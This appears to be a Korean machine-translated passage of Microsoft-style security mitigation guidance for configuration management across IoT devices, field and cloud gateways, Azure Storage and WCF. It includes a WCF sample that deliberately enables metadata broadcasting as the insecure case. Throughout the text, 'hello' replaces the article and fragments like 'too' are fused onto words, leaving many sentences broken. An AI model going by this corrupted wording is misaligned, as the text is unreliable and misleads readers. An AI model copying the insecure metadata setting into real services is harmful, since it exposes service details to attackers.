| **단계** | 같은 hello Web.config 구성 파일, appsettings.json은 종종 toohold 중요 한 정보를 사용자 이름, 암호, 데이터베이스 연결 문자열 및 암호화 키를 포함 하는 데 사용 합니다. 이 정보를 보호 하지 않는 경우 취약 tooattackers 또는 악의적인 사용자가 계정 사용자 이름 및 암호, 데이터베이스 이름 및 서버 이름이 같은 중요 한 정보를 가져오는 응용 프로그램은 합니다. Hello 배포 형식 (azure/온-프레미스)에 based, hello DPAPI 또는 Azure 키 자격 증명 모음와 같은 서비스를 사용 하 여 구성 파일의 중요 한 섹션을 암호화 합니다. |

## <a id="admin-strong"></a>모든 관리 인터페이스를 강력한 자격 증명으로 보호하는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 장치 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | Hello 장치를 관리 인터페이스 또는 강력한 자격 증명을 사용 하 여 필드 게이트웨이 노출 보호 되어야 합니다. 또한 WiFi, SSH, 파일 공유, FTP와 같이 공개된 다른 인터페이스도 모두 강력한 자격 증명으로 보호해야 합니다. 기본적인 약한 암호는 사용하면 안됩니다. |

## <a id="unknown-exe"></a>장치에서 알 수 없는 코드를 실행할 수 없는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 장치 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [Windows 10 IoT Core에서 보안 부팅 및 bit-locker 장치 암호화 사용](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **단계** | UEFI 보안 부팅 hello 시스템 제한 tooonly 지정된 기관에서 서명 된 이진 파일의 실행을 허용 합니다. 이 기능은 hello 플랫폼에서 실행 하 고 잠재적으로 그 hello 보안 상태를 약화 되 알 수 없는 코드를 방지 합니다. UEFI 보안 부팅을 사용 하도록 설정 하 고 코드 서명 하는 것에 대 한 신뢰할 수 있는 인증 기관 목록은 hello를 제한 합니다. Hello 신뢰할 수 있는 기관 중 하나를 사용 하 여 hello 장치에 배포 된 모든 코드에 서명 합니다. |

## <a id="partition-iot"></a>bit-locker를 사용하여 OS 및 IoT 장치의 추가 파티션 암호화

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 장치 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | Windows 10 IoT Core 경량 버전의 hello 플랫폼에서 hello 필요한 측정을 수행 하는 UEFI에서 hello 필요한 preOS 프로토콜을 포함 하 여 TPM의 hello 존재에 강력한 종속 비트 보관 장치 암호화를 구현 합니다. 이러한 preOS 측정 운영 체제의 hello OS가 시작 하는 방법을 선언적 레코드는 나중에 해당 hello를 확인 합니다. OS 사용 하 여 파티션을 비트 보관 및 모든 추가 파티션을 중요 한 데이터를 저장 하는 경우를 암호화 합니다. |

## <a id="min-enable"></a>장치에만 hello 최소 서비스/기능이 활성화 되어 있는지 확인 하십시오.

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 장치 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | 모든 기능이 나 hello hello hello 솔루션의 작동을 위해 필요 하지 않은 운영 체제에서에서 서비스를 해제 하거나 사용 하지 마십시오. 에 대 한 예를 들어 hello 장치에 배포 하는 UI toobe 필요 하지 않으면, 헤더 없는 모드에서 Windows IoT Core를 설치 합니다. |

## <a id="field-bit-locker"></a>bit-locker를 사용하여 OS 및 IoT 필드 게이트웨이의 추가 파티션 암호화

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 필드 게이트웨이 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | Windows 10 IoT Core 경량 버전의 hello 플랫폼에서 hello 필요한 측정을 수행 하는 UEFI에서 hello 필요한 preOS 프로토콜을 포함 하 여 TPM의 hello 존재에 강력한 종속 비트 보관 장치 암호화를 구현 합니다. 이러한 preOS 측정 운영 체제의 hello OS가 시작 하는 방법을 선언적 레코드는 나중에 해당 hello를 확인 합니다. OS 사용 하 여 파티션을 비트 보관 및 모든 추가 파티션을 중요 한 데이터를 저장 하는 경우를 암호화 합니다. |

## <a id="default-change"></a>Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 필드 게이트웨이 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오 |

## <a id="cloud-firmware"></a>해당 hello 클라우드 게이트웨이 구현 toodate 프로세스 tookeep hello 연결 된 장치 펌웨어 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | IoT 클라우드 게이트웨이 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 게이트웨이 선택 - Azure IoT Hub |
| **참조**              | [IoT 허브 장치 관리 개요](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [어떻게 tooupdate 장치 펌웨어](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **단계** | LWM2M는 hello Open Mobile Alliance IoT 장치 관리를 위한에서 프로토콜입니다. Azure IoT 장치 관리에 장치 작업을 사용 하는 물리적 장치와 toointeract 수 있습니다. 해당 hello 클라우드 게이트웨이 구현 프로세스 tooroutinely 유지 hello 장치 및 기타 구성 데이터를 Azure IoT 허브 장치 관리를 사용 하 여 toodate 확인 하십시오. |

## <a id="controls-policies"></a>장치에서 조직 정책에 따라 구성된 끝점 보안 제어를 사용하는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | 컴퓨터 신뢰 경계 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | 해당 없음  |
| **단계** | 장치에 디스크 수준 암호화를 위한 bit-locker, 업데이트된 서명이 있는 바이러스 백신, 호스트 기반 방화벽, OS 업그레이드, 그룹 정책 등과 같은 끝점 보안 제어 기능이 조직의 보안 정책에 따라 구성되어 있는지 확인합니다. |

## <a id="secure-keys"></a>Azure 저장소 액세스 키의 보안 관리 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | Azure 저장소 | 
| **SDL 단계**               | 배포 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [Azure Storage 보안 가이드 - 저장소 계정 키 관리](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **단계** | <p>키 저장소: toostore hello Azure 저장소 액세스 키를 암호로 사용 Azure 키 자격 증명 모음에는 것이 좋습니다 고 hello 응용 프로그램을 주요 자격 증명 모음에서 hello 키를 검색 합니다. 이 toohello 다음 인해 권장 이유:</p><ul><li>hello 응용 프로그램의 특정 사용 권한이 없는 toohello 키 액세스를 가져오는 다른 사람이 해당 통로 제거 하는 구성 파일에서 hello 저장소 키 하드 코드 된 있을 수 없습니다.</li><li>Azure Active Directory를 사용 하 여 액세스 toohello 키를 제어할 수 있습니다. 즉, 계정 소유자는 toohello 약간의 tooretrieve hello 키는 Azure 키 자격 증명 모음에서 필요로 하는 응용 프로그램 액세스 권한을 부여할 수 있습니다. 다른 응용 프로그램 권한을 부여 하지 않고 사용 권한을 구체적으로 수 tooaccess hello 키 됩니다.</li><li>키 다시 생성: toohave 내의 프로세스에 위치 tooregenerate Azure 저장소 액세스 키가 보안상의 이유로 것이 좋습니다. 근거, 방법 tooplan 키 다시 생성에 문서화 된에 대 한 hello Azure 저장소 보안 가이드에 대 한 내용은 문서를 참조 합니다.</li></ul>|

## <a id="cors-storage"></a>Azure 저장소에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | Azure 저장소 | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | 일반 |
| **특성**              | 해당 없음  |
| **참조**              | [Hello Azure 저장소 서비스에 대 한 CORS 지원](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **단계** | Azure 저장소 tooenable를 CORS – 교차 원본 자원 공유 있습니다. 각 저장소 계정에 대 한 hello 리소스 해당 저장소 계정에 액세스할 수 있는 도메인을 지정할 수 있습니다. 기본적으로 CORS는 모든 서비스에서 사용되지 않도록 설정되어 있습니다. CORS hello REST API 또는 hello 저장소 클라이언트 라이브러리 toocall hello 메서드 tooset hello 서비스 정책 중 하나를 사용 하 여 사용할 수 있습니다. |

## <a id="throttling"></a>WCF의 서비스 제한 기능을 사용하도록 설정

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | WCF | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | .NET Framework 3 |
| **특성**              | 해당 없음  |
| **참조**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify, 영국](https://vulncat.fortify.com/en/vulncat/index.html) |
| **단계** | <p>Hello에 제한을 두지 사용 시스템 리소스 및 리소스 소모 궁극적으로 서비스 거부 될 수 있습니다.</p><ul><li>**설명:** Windows Communication Foundation (WCF) hello 기능 toothrottle 서비스 요청을 제공 합니다. 클라이언트 요청을 너무 많이 허용하면 시스템이 과도하게 작동되며 해당 리소스가 모두 소모될 수 있습니다. Hello에 소수의 요청 tooa 서비스 허용 반면 hello 서비스를 사용 하 여 합법적인 사용자가 하지 못할 수 있습니다. 각 서비스를 구성 하는 개별적으로 조정 된 tooand tooallow hello 적절 한 양의 리소스 있어야 합니다.</li><li>**권장 사항:** WCF의 서비스 제한 기능을 사용하도록 설정하고 응용 프로그램에 적합한 제한을 설정합니다.</li></ul>|

### <a name="example"></a>예제
hello 다음은 사용 제한을 포함 하는 예제 구성입니다.
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF - 메타데이터를 통한 정보 공개

| 제목                   | 세부 정보      |
| ----------------------- | ------------ |
| **구성 요소**               | WCF | 
| **SDL 단계**               | 빌드 |  
| **적용 가능한 기술** | .NET Framework 3 |
| **특성**              | 해당 없음  |
| **참조**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify, 영국](https://vulncat.fortify.com/en/vulncat/index.html) |
| **단계** | 메타 데이터에는 hello 시스템에 대해 알아보고 공격의 형태를 계획 하는 공격자가 데 도움이 됩니다. WCF 서비스 구성된 tooexpose 메타 데이터를 수 있습니다. 메타데이터는 자세한 서비스 설명 정보를 제공하며 프로덕션 환경에서 브로드캐스트하지 않아야 합니다. hello `HttpGetEnabled`  /  `HttpsGetEnabled` 서비스는 hello 메타 데이터를 노출 하는지 여부를 정의 하는 hello ServiceMetaData 클래스의 속성 | 

### <a name="example"></a>예제
아래 hello 코드 지시 toobroadcast WCF 서비스의 메타 데이터
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
프로덕션 환경에서 서비스 메타데이터를 브로드캐스트하면 안됩니다. Hello HttpGetEnabled를 설정 / hello ServiceMetaData의 HttpsGetEnabled 속성이 toofalse 클래스입니다. 

### <a name="example"></a>예제
아래 hello 코드 WCF toonot 브로드캐스트 서비스의 메타 데이터에 지시 합니다. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
